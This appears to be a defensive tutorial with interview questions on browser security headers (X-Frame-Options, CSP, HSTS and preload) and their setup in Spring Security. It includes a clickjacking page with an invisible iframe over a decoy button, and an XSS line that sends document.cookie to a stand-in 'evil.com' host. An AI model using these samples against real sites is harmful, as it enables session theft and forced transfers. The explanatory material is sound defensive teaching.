Everything so far has been about deciding *who may do what*. Security headers are different: they are instructions your server sends telling the **browser** how to behave while rendering your site. Three of them carry most of the weight — and one of them has a famous hole on the very first request.

> [!info] 🧭 Summary
> - Security headers are **instructions to the browser**, not server-side checks. They defend the *user*, and only a browser honours them.
> - **`X-Frame-Options`** → stops **clickjacking**: your page loaded in an invisible iframe over a decoy button. `DENY` or `SAMEORIGIN`. Superseded by CSP `frame-ancestors`.
> - **CSP (`Content-Security-Policy`)** → mitigates **XSS**: a whitelist of where scripts, styles, images and connections may come from. Even if an attacker injects `<script src="evil.com">`, the browser refuses to load it.
> - **HSTS (`Strict-Transport-Security`)** → stops **SSL stripping**: "always use HTTPS for this domain for the next N seconds", remembered locally so the upgrade happens *before* any network traffic.
> - **HSTS's first-visit hole**: the browser can't know the policy until it has been to the site once. That first plain-HTTP request is interceptable — a MITM can strip the redirect and serve a fake page.
> - Fix: the **HSTS preload list**, shipped inside browsers — for preloaded domains the upgrade happens with zero network requests. But it can't hold every domain on earth, so the general answer is **HTTPS-First / HTTPS-Only browser modes** plus HTTPS everywhere.
> - The exploit to be able to narrate: airport Wi-Fi → user types `http://bank.com` → attacker intercepts, suppresses the 301, serves a look-alike login page or proxies HTTP↔HTTPS → captures credentials, cookies, session ids.
> - Once HSTS is known, `http://bank.com` is rewritten to `https://` **locally**, so there is no plaintext request to intercept.
> - Spring Security adds several headers **by default** (`X-Frame-Options: DENY`, `nosniff`, cache-control). **CSP and HSTS-over-HTTP you must configure yourself.**
> - Practice: redirect HTTP→HTTPS · `max-age=31536000; includeSubDomains; preload` · submit to the preload list.
>

## 1. `X-Frame-Options` — clickjacking

### The attack

A banking page:

```text
https://bank.com/transfer
```

The attacker embeds it invisibly and puts a decoy underneath:

```html
<style>
  iframe { opacity: 0; position: absolute; top: 0; left: 0; z-index: 2; }
  button { position: absolute; top: 120px; left: 90px; z-index: 1; }
</style>

<button>Click here to win ₹1000</button>
<iframe src="https://bank.com/transfer"></iframe>
```

The user sees a harmless button. The click lands on the **real bank page**, positioned so the pointer hits "Confirm Transfer" — with the user's real session cookie attached, because the iframe is a genuine `bank.com` document.

That's **clickjacking**: hijacking a real click on a real page the user can't see.

Note what doesn't help: the session is valid, the CSRF token is present (it's the bank's own page that supplies it), and CORS is irrelevant. Only a framing rule stops it.

### The defence

```text
X-Frame-Options: DENY
```

The browser refuses to render the page inside any frame.

| Value | Meaning |
|---|---|
| `DENY` | never framed, by anyone |
| `SAMEORIGIN` | only pages from the same origin may frame it |
| ~~`ALLOW-FROM uri`~~ | deprecated, poor support — use CSP instead |

```text
bank.com  iframes  bank.com   ->  allowed under SAMEORIGIN
evil.com  iframes  bank.com   ->  blocked
```

### The modern replacement

```text
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self' https://partner.company.com
```

`frame-ancestors` supersedes `X-Frame-Options` — it takes a list of origins, which `X-Frame-Options` never could. Send both for a few more years: old browsers read the legacy header, new ones prefer CSP.

## 2. CSP — Content Security Policy

### The problem

Your page renders user input without escaping it:

```html
<div>Hello, <script>fetch('https://evil.com/steal?c=' + document.cookie)</script></div>
```

The attacker's JavaScript now runs **on your origin**, with your DOM, your cookies (unless `HttpOnly`) and your CSRF token. That's **XSS**, and as noted in [[16. CSRF Deep Dive]] §5 it defeats every other defence you have.

### The defence

CSP tells the browser **where resources may legitimately come from**:

```text
Content-Security-Policy: default-src 'self'
```

> Only load resources from my own origin.

```text
Content-Security-Policy: script-src 'self'

<script src="/app.js"></script>                    ->  allowed
<script src="https://evil.com/hack.js"></script>   ->  BLOCKED by CSP
```

Even a **successful injection** fails to execute, because the browser refuses the load. CSP is the second wall behind output encoding.

### A realistic policy

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.company.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.company.com;
  connect-src 'self' https://api.company.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  form-action 'self';
  base-uri 'self';
  object-src 'none';
```

| Directive | Controls |
|---|---|
| `default-src` | the fallback for everything unspecified |
| `script-src` | JavaScript — **the one that matters most** |
| `style-src` | CSS |
| `img-src` | images (`data:` for inline base64) |
| `connect-src` | `fetch` / XHR / WebSocket destinations |
| `frame-ancestors` | who may frame **you** (replaces `X-Frame-Options`) |
| `form-action` | where forms may submit — blocks injected exfiltration forms |
| `object-src` | plugins; set `'none'` |

> [!warning] `'unsafe-inline'` in `script-src` undoes CSP
> It re-permits `<script>alert(1)</script>` — the exact thing you're defending against. Inline scripts need a **nonce** or a hash instead:
> ```text
> script-src 'self' 'nonce-r4nd0mV4lu3'
> <script nonce="r4nd0mV4lu3"> ... </script>
> ```
> The nonce must be regenerated per response. `'unsafe-eval'` is similarly dangerous and is required by some older frameworks — a reason to upgrade them.

### Rolling it out

```text
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

Report-only mode logs violations without blocking, which is the only sane way to introduce CSP to an existing app. Run it for a couple of weeks, fix what it reports, then enforce.

## 3. HSTS — Strict Transport Security

### The problem

The user types:

```text
http://bank.com
```

not `https://`. That first request goes out **unencrypted**. On public Wi-Fi an attacker in the middle can read and rewrite it — the **SSL stripping** attack.

### The defence

Over HTTPS, the server sends:

```text
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

> For the next year, contact this domain over HTTPS only.

The browser records it:

```text
bank.com  =>  HTTPS only, until 2027-08-27
```

Now, whatever the user types:

```text
user types:  http://bank.com
browser:     rewrites to https://bank.com  LOCALLY
network:     only ever sees the HTTPS request
```

The rewrite happens **before any packet leaves the machine**, which is the entire point — there is no plaintext request for anyone to intercept. It also converts TLS warnings from click-through to hard failures on that domain.

| Directive | Meaning |
|---|---|
| `max-age=31536000` | remember for 1 year (seconds) |
| `includeSubDomains` | applies to every subdomain too |
| `preload` | consent to be shipped in browsers' built-in list |

> [!warning] HSTS is hard to undo
> Send `includeSubDomains` and every subdomain must serve valid HTTPS — an internal tool on plain HTTP becomes unreachable, and clients keep enforcing until `max-age` expires. Ramp up: `max-age=300`, then a day, then a year. Getting on the preload list is essentially permanent; removal takes months to propagate.

## 4. The first-request problem

The question that shows you actually understand HSTS.

```text
A user has NEVER visited https://bank.com.
They type http://bank.com.

Browser: "do I have an HSTS policy for bank.com?"  ->  no
So it sends a plain HTTP request.
```

### What normally happens

```text
GET http://bank.com
   |
301 Moved Permanently
Location: https://bank.com
   |
https://bank.com
   |
Strict-Transport-Security: max-age=31536000
   |
browser stores: bank.com => HTTPS only
```

From the second visit onward, safe. **The first one is not.**

### Where the danger is

You're on airport Wi-Fi. An attacker is on the same network, positioned between you and the internet.

```text
You type:  http://bank.com
   |
   v
Attacker intercepts (the request is plaintext)
```

Two things they can do:

**(a) Serve a fake page.** Instead of forwarding the `301`, they answer themselves:

```text
200 OK
<pixel-perfect bank login page>
```

The user sees the expected screen, types their credentials, and the attacker has them immediately. This is phishing delivered by network position rather than a bad link — the URL bar even says `bank.com`.

**(b) SSL stripping.** More durable. The attacker maintains two connections:

```text
You  ---- HTTP (plaintext) ---->  Attacker  ---- HTTPS ---->  Bank
     <--- HTTP (rewritten) -----            <--- HTTPS ----
```

The bank sees a normal HTTPS client. You see a working website. The attacker rewrites every `https://` link in the responses to `http://` so you never get upgraded, and reads everything in between:

```text
usernames · passwords · session ids · JWTs in cookies · form data
```

You've never reached HTTPS, so there is no certificate for the browser to warn you about — only the absent padlock, which almost nobody checks.

### Why HSTS stops this on visit two

```text
Browser already knows: bank.com => HTTPS only
http://bank.com is rewritten locally to https://bank.com
   -> no plaintext request exists
   -> the attacker has nothing to intercept
   -> TLS protects the rest, and a forged cert is a hard error
```

So HSTS is a *trust on first use* mechanism. It protects visit 2..N perfectly, and visit 1 not at all.

## 5. How browsers close the first-visit gap

### HSTS preload

Browsers ship a **built-in list** of domains known to require HTTPS — tens of thousands of entries, compiled into Chrome, Firefox, Safari and Edge:

```text
google.com · github.com · paypal.com · amazon.com · ...
```

```text
user types:  http://github.com
browser:     "github.com is in the preload list"
             -> https://github.com
             -> NO HTTP request ever sent, on the very first visit
```

Submit at `hstspreload.org`; requirements are a valid cert, an HTTP→HTTPS redirect, and `max-age=31536000; includeSubDomains; preload`.

### But the list can't hold every domain

Straight answer to the obvious objection: **it can't, and browsers don't pretend otherwise.** For a brand-new `new-startup-xyz.com` the browser has two choices — try HTTP first, or try HTTPS first — and historically it tried HTTP because most of the web was HTTP.

### HTTPS-First / HTTPS-Only mode

Modern browsers have flipped that default:

```text
user types:  example.com
browser:     try https://example.com FIRST
             works?  -> stay on HTTPS
             fails?  -> warn, or fall back to HTTP depending on settings
```

Chrome, Firefox and Safari all now attempt HTTPS first for typed navigations, and HTTPS-Only mode makes the fallback a hard block. Combined with the fact that ~95% of the web is HTTPS and certificates are free, the exposure has shrunk enormously.

### The honest summary

```text
Without HSTS         user -> HTTP -> interceptable
HSTS already learned browser upgrades locally -> secure
HSTS preload         browser knew before the first request -> secure
HTTPS-First mode     browser tries HTTPS first anyway -> mostly secure
```

There is **no perfect solution** for an unknown domain's first contact. The web's defence is layered: HTTPS everywhere + HSTS + preload + HTTPS-First browser behaviour.

### Can an attacker read HTTPS traffic?

Normally, no. TLS encrypts the payload; without the server's private key or a certificate the browser will trust, an attacker sees ciphertext. They cannot read passwords, JWTs, cookies or account data. Which is why the *only* window is that first plaintext request — and why the whole design effort goes into eliminating it.

## 6. Putting it together in Spring Security

Spring Security's defaults already include several headers:

```text
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000 ; includeSubDomains   (HTTPS requests only)
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
```

**CSP is not** among them — the framework can't guess your resource origins.

```java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .frameOptions(frame -> frame.deny())
        .contentSecurityPolicy(csp -> csp.policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' https://cdn.company.com; " +
            "object-src 'none'; " +
            "frame-ancestors 'none'; " +
            "form-action 'self'"))
        .httpStrictTransportSecurity(hsts -> hsts
            .includeSubDomains(true)
            .preload(true)
            .maxAgeInSeconds(31536000))
        .referrerPolicy(r -> r.policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
    );
    return http.build();
}
```

Plus the redirect, without which HSTS is never delivered to an HTTP-first visitor:

```java
http.requiresChannel(c -> c.anyRequest().requiresSecure());
```

> [!warning] Behind a load balancer, Spring thinks every request is HTTP
> TLS terminates at the LB, so Spring sees plain HTTP internally, skips the HSTS header, and can build `http://` redirect URLs. Set `server.forward-headers-strategy=framework` so `X-Forwarded-Proto` is honoured. Same root cause as the OAuth2 `redirect_uri` mismatch in [[12. OAuth2 Login and SSO]] §6.

### A production banking response

```text
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Cache-Control: no-store
```

| Header | Protects against |
|---|---|
| `X-Frame-Options` / `frame-ancestors` | clickjacking |
| `Content-Security-Policy` | XSS, malicious resource loading, data exfiltration |
| `Strict-Transport-Security` | SSL stripping, downgrade, insecure first hop |
| `X-Content-Type-Options: nosniff` | MIME sniffing (a "text" upload executed as JS) |
| `Referrer-Policy` | leaking URLs (and tokens in them) to third parties |
| `Cache-Control: no-store` | sensitive pages surviving in a shared machine's cache |

## ❓ Interview Questions

### Q1. What does `X-Frame-Options` protect against?

Clickjacking. An attacker loads your page in an invisible iframe over a decoy UI, so the victim's click lands on your real, authenticated page. `DENY` or `SAMEORIGIN` tells the browser to refuse to render you in a frame.

### Q2. What replaced it?

CSP's `frame-ancestors`, which takes a list of permitted origins — something `X-Frame-Options` could never express. Send both during the transition.

### Q3. What is CSP and how does it mitigate XSS?

A whitelist of allowed sources per resource type. Even if an attacker injects a script tag, the browser refuses to load a script from an origin the policy doesn't permit. It's a second wall behind output encoding, not a replacement for it.

### Q4. Why is `'unsafe-inline'` a problem?

It re-allows inline `<script>` blocks — exactly what XSS injects — which defeats most of the policy. Use per-response nonces or hashes.

### Q5. What does HSTS do?

Tells the browser to use HTTPS only for this domain for `max-age` seconds. The browser then rewrites `http://` to `https://` **locally**, before any network request, defeating SSL stripping.

### Q6. What happens on the very first HTTP request, before HSTS is known?

HSTS can't protect it — the browser has no policy yet. An attacker on the path can suppress the redirect and serve a fake page, or proxy HTTP↔HTTPS and read everything. Browsers close the gap with the **HSTS preload list**, shipped inside the browser, so preloaded domains are upgraded with no network request at all.

### Q7. How can browsers preload every website?

They can't — no list can cover billions of current and future domains. Preload covers high-value domains; for the rest, modern browsers use **HTTPS-First / HTTPS-Only mode**, attempting HTTPS before HTTP. The defence is layered, not perfect.

### Q8. Walk through an SSL stripping attack.

On a shared network the attacker intercepts the victim's plaintext `http://bank.com` request. They hold an HTTPS connection to the bank and a plaintext one to the victim, rewriting `https://` links to `http://` in every response. The bank sees a normal client, the victim sees a working site, and everything in between — credentials, cookies, session ids — is readable. No certificate warning appears because TLS was never attempted on the victim's side.

### Q9. Can an attacker read HTTPS traffic once established?

No, absent the server's private key or a certificate the browser trusts. That's why the entire attack surface is the first plaintext hop, and why eliminating it is the goal.

### Q10. Which headers does Spring Security set by default?

`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, HSTS on HTTPS requests, and cache-control headers. **CSP is not set by default** — you must configure it.

### Q11. Why doesn't my HSTS header appear in production?

TLS is usually terminated at the load balancer, so Spring sees plain HTTP and skips the header. Set `server.forward-headers-strategy=framework` so `X-Forwarded-Proto` is respected.

### Q12. What's risky about `includeSubDomains`?

Every subdomain must serve valid HTTPS, immediately and for the whole `max-age`. An internal tool still on HTTP becomes unreachable, and you cannot recall the policy from clients that already stored it.

---

> [!tip] ⚡ Quick Recall
> - Security headers = **instructions to the browser**. Only browsers honour them; they protect users, not the API.
> - **`X-Frame-Options: DENY|SAMEORIGIN`** → clickjacking (invisible iframe + decoy button). Modern form: **CSP `frame-ancestors`**.
> - **CSP** → XSS. `default-src 'self'`, `script-src` matters most; **`'unsafe-inline'` defeats it** — use nonces. Roll out with **Report-Only**.
> - **HSTS** → SSL stripping. `max-age=31536000; includeSubDomains; preload`. Browser rewrites `http→https` **locally, before any packet**.
> - **First-visit hole**: no policy yet → that one plaintext request is interceptable (fake login page, or HTTP↔HTTPS proxy).
> - **HSTS preload list** ships inside browsers → zero-request upgrade, but can't cover every domain → **HTTPS-First mode** covers the rest.
> - Once HSTS is learned, there is **no plaintext request to intercept**; established TLS is not readable by a MITM.
> - Spring sets `nosniff`, `X-Frame-Options: DENY`, HSTS, cache-control **by default**. **CSP you must add.**
> - Behind a LB: **`server.forward-headers-strategy=framework`**, or no HSTS header is ever sent.
> - `includeSubDomains` is a **one-way door** — ramp `max-age` up slowly.
